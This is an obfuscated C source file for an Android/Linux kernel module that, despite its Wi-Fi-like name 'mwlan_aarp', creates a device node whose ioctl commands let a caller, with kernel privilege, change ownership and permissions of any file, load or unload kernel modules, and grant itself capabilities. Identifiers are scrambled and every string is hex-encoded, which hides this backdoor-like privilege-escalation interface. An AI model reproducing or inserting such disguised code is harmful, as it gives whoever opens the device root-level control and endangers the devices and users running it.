/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Mon Sep  3 14:27:49 2012
*/
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb52
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bba bb61 bb93;
#else
bba bbd bb47, *bb121, *bb188;
#define bb137 1
#define bb84 0
bba bb193 bb209, *bb236, *bb183;bba bbd bb226, *bb145, *bb225;bba bbt
bb199, *bb96, *bb149;bba bbu bb192, *bb113;bba bbt bbu bb133, *bb147;
bba bbu bb58, *bb150;bba bbt bbu bb35, *bb94;bba bb35 bb185, *bb233;
bba bb35 bb95, *bb227;bba bb58 bb61, *bb108;bba bb229 bb204;bba bb194
bb216;bba bb135 bb66;bba bb76 bb50;bba bb76 bb131;
#ifdef bb234
bba bb148 bb24, *bb41;bba bb210 bb14, *bb65;bba bb195 bbp, *bb19;bba
bb114 bb18, *bb82;
#else
bba bb168 bb24, *bb41;bba bb125 bb14, *bb65;bba bb107 bbp, *bb19;bba
bb139 bb18, *bb82;
#endif
bba bb24 bb38, *bb25, *bb175;bba bb14 bb196, *bb99, *bb170;bba bb14
bb134, *bb106, *bb171;bba bbp bb43, *bb165, *bb202;bba bb66 bb8, *
bb155, *bb97;bba bbp bb237, *bb98, *bb187;bba bb50 bb144, *bb191, *
bb203;bba bb18 bb198, *bb241, *bb189;
#define bb136 bbf
bba bbf*bb221, *bb100;bba bbj bbf*bb178;bba bbb bb110;bba bbb*bb231;
bba bbj bbb*bb186;
#if defined( bb52)
bba bbd bb74;
#endif
bba bb74 bb4;bba bb4*bb105;bba bbj bb4*bb228;
#if defined( bb146) || defined( bb164)
bba bb4 bb12;bba bb4 bb42;
#else
bba bbb bb12;bba bbt bbb bb42;
#endif
bba bbj bb12*bb103;bba bb12*bb132;bba bb43 bb197, *bb232;bba bbf*bb81
;bba bb81*bb181;
#define bb159( bb10) bbg bb10##__ { bbd bb116; }; bba bbg bb10##__  * \
 bb10
bba bbg{bb8 bb143,bb174,bb220,bb217;}bb90, *bb211, *bb160;bba bbg{bb8
bb235,bb223;}bb157, *bb130, *bb190;bba bbg{bb8 bb89,bb85;}bb242, *
bb213, *bb214;
#endif
bba bbj bb38*bb153;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb1 bb206
#define bb16 bb218
bba bbt bbu bb1;bba bbu bb16;
#endif
#else
#endif
#ifdef _WIN32
bbf*bb39(bb1 bb68);bbf bb33(bbf* );bbf*bb46(bb1 bb215,bb1 bb68);
#else
#define bb39( bbc) bb62(1, bbc, bb30)
#define bb33( bbc) bb172( bbc)
#define bb46( bbc, bb49) bb62( bbc, bb49, bb30)
#endif
#ifdef _WIN32
#define bb34( bbc) bb117( bbc)
#else
#ifdef _DEBUG
bbd bb70(bbj bbb*bb87,bbj bbb*bbw,bbt bb219);
#define bb34( bbc) ( bbf)(( bbc) || ( bb70(# bbc, __FILE__, __LINE__)))
#else
#define bb34( bbc) (( bbf)0)
#endif
#endif
bb16 bb152(bb16*bb86);
#ifndef _WIN32
bbd bb118(bbj bbb*bb104);bbd bb201(bbj bbb*bb177,...);
#endif
#ifdef _WIN32
bba bb158 bb53;
#define bb51( bbc) bb180( bbc)
#define bb63( bbc) bb140( bbc)
#define bb48( bbc) bb101( bbc)
#define bb78( bbc) bb238( bbc)
#else
bba bb208 bb53;
#define bb51( bbc) ( bbf)(  *  bbc = bb224( bbc))
#define bb63( bbc) (( bbf)0)
#define bb48( bbc) bb119( bbc)
#define bb78( bbc) bb102( bbc)
#endif
#include"uncobf.h"
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<net/ip.h>
#include"cobf.h"
bba bbg{bb25 bb69;bbp bb156;bb25 bb21;bbp bb32;bbp bbv;}bb11;bba bbg{
bbj bbb*bbh;bb142 bb72;bb123 bb40;}bb20;bba bbg{bbj bbb*bbh;bbd bb15;
}bb37;bba bbg{bb47 bb79;bbj bbb*bb2;}bb36;bba bbg{bbd bb207;bbg bb122
 *bb240;bbd bb115;}bb124;bbn bbd bb55(bbg bb7*bb7,bbg bbw*bbw){bbq 0 ;
}bbn bbd bb56(bbg bb7*bb7,bbg bbw*bbw){bbq 0 ;}bbn bbd bbz(bbb*bbh,bbb
 * *bbm,bbb* *bbr,bb88 bb92 bb26){bbg bb163*bb13;bb129 bb59=(bb26==
bb154)?bb30:bb111;
#ifdef _DEBUG
bbk("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c"
"\x70\x65\x72\x5f\x2c\x20\x70\x61\x74\x68\x3a\x20\x25\x73\n",bbh);
#endif
bb13=bb127(bbh,bbm,bbr,bb59);bb0(bb13==bbo){bbk("\x63\x61\x6c\x6c\x5f"
"\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20"
"\x69\x6e\x66\x6f\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\n");bbq-bb44;}bbq
bb182(bb13,bb26);}bbn bbd bb71(bbj bbb*bbh,bbd bb54,bbd bb60){bbb bb22
[256 ];bbb*bbm[]={(bbb* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e"
"\x2f\x63\x68\x6f\x77\x6e",bb22,(bbb* )bbh,bbo};bbn bbb*bbr[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbo};bbd bbe;bb67(bb22,"\x25\x64\x2e\x25\x64",bb54,bb60);bbe=bbz(""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62"
"\x6f\x78",bbm,bbr,1 );
#ifdef _DEBUG
bbk("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbe);
#endif
bbq bbe;}bbn bbd bb73(bbj bbb*bbh,bbd bb15){bbb bb29[256 ];bbb*bbm[]={
(bbb* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb29,(bbb* )bbh,bbo};bbd bbe;bbn bbb*bbr[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbo};bb67(
bb29,"\x25\x6f",bb15);bbe=bbz("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbm,bbr,1 );
#ifdef _DEBUG
bbk("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbe);
#endif
bbq bbe;}bbn bbu bb64(bbg bbw*bbw,bbt bbd bb91,bbt bbu bb57){bbp bb31
;bb11 bbl, *bb6=(bb11* )bb57;bb38*bbi;(bbf)(bb5(&bbl,bb6,bb9(bb11))==
0 );bbi=bb39(bbl.bb32);bb0(bbi==bbo)bbq-4 ;(bbf)(bb173(bb31,(bb19)bbl.
bb69)==0 );(bbf)(bb5(bbi,bbl.bb21,bbl.bb32)==0 );bb120(bb31){bb17 1 :{
bb20*bby=(bb20* )bbi;bbb bbh[256 ];(bbf)(bb5(bbh,bby->bbh,bb9(bbh))==0
);bbl.bbv=4 ; * ((bbp* )bbi)=bb71(bbh,bby->bb72,bby->bb40);
#ifdef _DEBUG
bbk("\x63\x68\x6f\x77\x6e\n");
#endif
bb3;}bb17 2 :{bb37*bby=(bb37* )bbi;bbb bbh[256 ];(bbf)(bb5(bbh,bby->bbh
,bb9(bbh))==0 );bbl.bbv=4 ; * ((bbp* )bbi)=bb73(bbh,bby->bb15);
#ifdef _DEBUG
bbk("\x63\x68\x6d\x6f\x64\n");
#endif
bb3;}bb17 3 :{bb36*bb28=(bb36* )bbi;bbb bb2[256 ];bbb*bbm[]={bbo,bb2,
bbo};bbn bbb*bbr[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d"
"\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e",bbo};(bbf)(bb5(bb2,bb28->bb2,256 )==0 );bbm[0 ]=
bb28->bb79?"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x69\x6e"
"\x73\x6d\x6f\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f"
"\x72\x6d\x6d\x6f\x64"; * (bbp* )bbi=bbz("\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbm,bbr,1 );bbl
.bbv=4 ;
#ifdef _DEBUG
bbk("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n", * (
bbd* )bbi);
#endif
bb3;}bb17 5 :{bbd bbe;bb176{bbg bb184*bbs=bb222();bb0(!bbs){bbe=bb44;
bb3;}bbs->bb23.bbx[0 ]=(1 <<bb126)|(1 <<bb166)|(1 <<bb83);bbs->bb80.bbx[0
]=0 ;bbs->bb75.bbx[0 ]=bbs->bb23.bbx[0 ];bbs->bb23.bbx[1 ]=0 ;bbs->bb80.
bbx[1 ]=0 ;bbs->bb75.bbx[1 ]=0 ;bbe=bb230(bbs);}bb128(0 ); * (bbd* )bbi=
bbe;bbl.bbv=bb9(bbd);
#ifdef _DEBUG
bbk("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x70\x73\x65\x74\x3a\x20\x25"
"\x64\n",bbe);
#endif
bb3;}}(bbf)(bb112(bb6->bb21,bbi,bbl.bbv)==0 );(bbf)(bb138(bbl.bbv,&bb6
->bbv)==0 );bb33(bbi);bbq 0 ;}bbn bbg bb169 bb45={.bb151=bb64,.bb200=
bb55,.bb239=bb56,};bbn bbg bb205 bb27={bb167,"\x6d\x77\x6c\x61\x6e"
"\x5f\x61\x61\x72\x70",&bb45};bbd bb212(){bbd bbe;bbe=bb161(&bb27);
bb0(bbe!=0 ){bbk("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20"
"\x6d\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66\x61\x69"
"\x6c\x65\x64\x3a\x20\x25\x64\n",bbe);bbq bbe;}{bbb*bbm[]={"\x2f\x73"
"\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e","\x73"
"\x79\x73\x74\x65\x6d\x2e\x73\x79\x73\x74\x65\x6d","\x2f\x64\x65\x76"
"\x2f" "\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbo};bbn bbb*bbr[]=
{"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78"
,"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbo};bbe=bbz("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74"
"\x6f\x6f\x6c\x62\x6f\x78",bbm,bbr,1 );bbk("\x69\x6e\x69\x74\x5f\x6d"
"\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d"
"\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbe);bbe
=bbz("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f"
"\x6c\x62\x6f\x78",bbm,bbr,1 );bbk("\x69\x6e\x69\x74\x5f\x6d\x6f\x64"
"\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbe);}bb0(bbe!=0
){bbk("\x6d\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66"
"\x61\x69\x6c\x65\x64\x2c\x20\x25\x64\n",bbe);bbq bbe;}bbk("\x6d\x77"
"\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e\x69\x74\x5f\x6d\x6f\x64"
"\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73"
"\x66\x75\x6c\x2e\n");bbq 0 ;}bbf bb141(){bb109(&bb27);}bb162("\x61"
"\x68\x6f\x70\x65");bb179("");
